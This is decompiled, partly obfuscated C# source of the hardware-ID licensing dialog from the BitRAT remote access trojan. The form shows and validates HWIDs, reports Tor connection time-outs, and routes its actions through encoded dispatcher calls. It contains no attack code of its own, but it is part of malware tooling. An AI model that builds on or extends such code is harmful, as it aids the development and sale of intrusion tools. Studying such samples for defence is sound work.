﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fHWIDUpdate : Form
{
    private IContainer icontainer_0;
    private Label label_0;
    private VisualButton visualButton_0;
    private TextBox textBox_0;
    private Label label_1;
    private Label label_2;
    private Label label_3;
    private BackgroundWorker backgroundWorker_0;
    private PictureBox pictureBox_0;
    private Label label_4;
    private readonly Struct18 struct18_0;
    private Struct18 struct18_1;
    private Struct16 struct16_0;

    public fHWIDUpdate()
    {
        base.Load += new EventHandler(this.fHWIDUpdate_Load);
        base.Closing += new CancelEventHandler(this.fHWIDUpdate_Closing);
        this.InitializeComponent();
    }

    [CompilerGenerated]
    private void _Lambda$__R47-1()
    {
        this.method_1();
    }

    [CompilerGenerated]
    private void _Lambda$__R50-2()
    {
        this.method_1();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fHWIDUpdate_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fHWIDUpdate_Load(object sender, EventArgs e)
    {
        this.vmethod_0().Text = "If you already own a license and have changed system, then simply update your HWID and restart BitRAT.\r\n\r\nIf you've haven't changed sytem and seeing this window,\r\nthen it could be due to an unexpected HWID change of your system.\r\n\r\nNOTE: This can also happen if you've just updated " + Application.ProductName + "\r\n and a change in HWID mechanism was made by us in the updated version.";
        this.vmethod_10().Text = Class136.smethod_41();
        this.vmethod_16().Left = (this.vmethod_10().Left + this.vmethod_10().Width) + 5;
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new Label());
        this.vmethod_3(new VisualButton());
        this.vmethod_5(new TextBox());
        this.vmethod_7(new Label());
        this.vmethod_9(new Label());
        this.vmethod_11(new Label());
        this.vmethod_13(new BackgroundWorker());
        this.vmethod_15(new PictureBox());
        this.vmethod_17(new Label());
        ((ISupportInitialize) this.vmethod_14()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().BackColor = Color.Transparent;
        this.vmethod_0().Location = new Point(12, 9);
        this.vmethod_0().Name = "lblInfo";
        this.vmethod_0().Size = new Size(0x221, 0x92);
        this.vmethod_0().TabIndex = 0x85;
        this.vmethod_0().TextAlign = ContentAlignment.TopCenter;
        this.vmethod_2().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_2().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_2().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_2().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_2().Border.HoverVisible = true;
        this.vmethod_2().Border.Rounding = 6;
        this.vmethod_2().Border.Thickness = 1;
        this.vmethod_2().Border.Type = ShapeTypes.Rounded;
        this.vmethod_2().Border.Visible = true;
        this.vmethod_2().DialogResult = DialogResult.None;
        this.vmethod_2().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_2().Image = null;
        this.vmethod_2().Location = new Point(0x155, 0xba);
        this.vmethod_2().MouseState = MouseStates.Normal;
        this.vmethod_2().Name = "btnHWIDUpdate";
        this.vmethod_2().Size = new Size(80, 0x13);
        this.vmethod_2().TabIndex = 0x88;
        this.vmethod_2().Text = "Update";
        this.vmethod_2().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_2().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_2().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_4().Location = new Point(0xc4, 0xb9);
        this.vmethod_4().Margin = new Padding(1);
        this.vmethod_4().MaxLength = 0x10;
        this.vmethod_4().Name = "txtHWIDOld";
        this.vmethod_4().Size = new Size(0x8d, 20);
        this.vmethod_4().TabIndex = 0x87;
        this.vmethod_6().AutoSize = true;
        this.vmethod_6().BackColor = Color.Transparent;
        this.vmethod_6().FlatStyle = FlatStyle.Flat;
        this.vmethod_6().Location = new Point(0x7c, 0xbc);
        this.vmethod_6().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_6().Name = "lblHWIDOld";
        this.vmethod_6().Size = new Size(0x3e, 13);
        this.vmethod_6().TabIndex = 0x86;
        this.vmethod_6().Text = "First HWID:";
        this.vmethod_6().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_8().AutoSize = true;
        this.vmethod_8().BackColor = Color.Transparent;
        this.vmethod_8().FlatStyle = FlatStyle.Flat;
        this.vmethod_8().Location = new Point(0x79, 0xa6);
        this.vmethod_8().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_8().Name = "lblWIDNew";
        this.vmethod_8().Size = new Size(0x41, 13);
        this.vmethod_8().TabIndex = 0x89;
        this.vmethod_8().Text = "New HWID:";
        this.vmethod_8().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_10().AutoSize = true;
        this.vmethod_10().BackColor = Color.Transparent;
        this.vmethod_10().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
        this.vmethod_10().ForeColor = Color.RoyalBlue;
        this.vmethod_10().Location = new Point(0xc1, 0xa6);
        this.vmethod_10().Name = "lblHWID";
        this.vmethod_10().Size = new Size(30, 13);
        this.vmethod_10().TabIndex = 0x8a;
        this.vmethod_10().Text = "N/A";
        this.vmethod_12().WorkerSupportsCancellation = true;
        this.vmethod_14().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_14().Image = Class131.smethod_17();
        this.vmethod_14().Location = new Point(0x6a, 0xbb);
        this.vmethod_14().Margin = new Padding(2);
        this.vmethod_14().Name = "pbOldHWID";
        this.vmethod_14().Size = new Size(15, 15);
        this.vmethod_14().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_14().TabIndex = 0x8b;
        this.vmethod_14().TabStop = false;
        this.vmethod_16().AutoSize = true;
        this.vmethod_16().BackColor = Color.Transparent;
        this.vmethod_16().FlatStyle = FlatStyle.Flat;
        this.vmethod_16().Location = new Point(0xe3, 0xa5);
        this.vmethod_16().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_16().Name = "lblNoSave";
        this.vmethod_16().Size = new Size(0x95, 13);
        this.vmethod_16().TabIndex = 140;
        this.vmethod_16().Text = "(You do not need to save this)";
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = SystemColors.AppWorkspace;
        base.ClientSize = new Size(0x239, 0xd4);
        base.Controls.Add(this.vmethod_16());
        base.Controls.Add(this.vmethod_14());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_2());
        base.Controls.Add(this.vmethod_4());
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_0());
        base.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        base.MaximizeBox = false;
        base.MinimizeBox = false;
        base.Name = "fHWIDUpdate";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        this.Text = "HWID Update";
        ((ISupportInitialize) this.vmethod_14()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    private void method_0(object sender, EventArgs e)
    {
        if ((this.vmethod_4().TextLength < 0x10) | !Class136.smethod_39(this.vmethod_4().Text))
        {
            Interaction.MsgBox("Invalid HWID format!", MsgBoxStyle.Critical, Application.ProductName);
        }
        else
        {
            this.vmethod_2().Enabled = false;
            new Thread(new ThreadStart(this.method_3)).Start();
        }
    }

    public unsafe bool method_1()
    {
        object[] objArray = new object[] { this };
        return *(((bool*) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O=%*?=Jg", objArray)));
    }

    public void method_2()
    {
        object[] objArray = new object[] { this };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<[*?<TN", objArray);
    }

    public void method_3()
    {
        object[] objArray = new object[] { this };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<;*?>#!", objArray);
    }

    private void method_4(object sender, DoWorkEventArgs e)
    {
        int num = 1;
        while (true)
        {
            Thread.Sleep(0x3e8);
            if (!this.vmethod_12().CancellationPending)
            {
                if ((num + 1) <= 300)
                {
                    continue;
                }
                Interaction.MsgBox("Failed to connect via Tor! (Time-out)\r\n\r\nPlease, restart " + Application.ProductName + " and try again later.", MsgBoxStyle.Critical, Application.ProductName);
            }
            return;
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        Interaction.MsgBox("This field should be the old HWID that you were told to save and displayed in the payment form.\r\n\r\nIf you for whatever reason have forgot your first HWID, then then old way to recover your license is to provide support with payment information, i.e a link to the transaction in the blockchain.\r\n\r\nShould you not have access to any of the above, then there is sadly no way for support to verify your license, hence why it was explicitly stated in the payment form that the HWID needs to be saved.", MsgBoxStyle.Question, Application.ProductName);
    }

    internal virtual Label vmethod_0()
    {
        return this.label_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(Label label_5)
    {
        this.label_0 = label_5;
    }

    internal virtual Label vmethod_10()
    {
        return this.label_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(Label label_5)
    {
        this.label_3 = label_5;
    }

    internal virtual BackgroundWorker vmethod_12()
    {
        return this.backgroundWorker_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(BackgroundWorker backgroundWorker_1)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_4);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_0 = backgroundWorker_1;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual PictureBox vmethod_14()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(PictureBox pictureBox_1)
    {
        EventHandler handler = new EventHandler(this.method_5);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_1;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_16()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(Label label_5)
    {
        this.label_4 = label_5;
    }

    internal virtual VisualButton vmethod_2()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(VisualButton visualButton_1)
    {
        EventHandler handler = new EventHandler(this.method_0);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_1;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TextBox vmethod_4()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(TextBox textBox_1)
    {
        this.textBox_0 = textBox_1;
    }

    internal virtual Label vmethod_6()
    {
        return this.label_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(Label label_5)
    {
        this.label_1 = label_5;
    }

    internal virtual Label vmethod_8()
    {
        return this.label_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(Label label_5)
    {
        this.label_2 = label_5;
    }

    private delegate void Delegate56();

    private delegate void Delegate57();
}

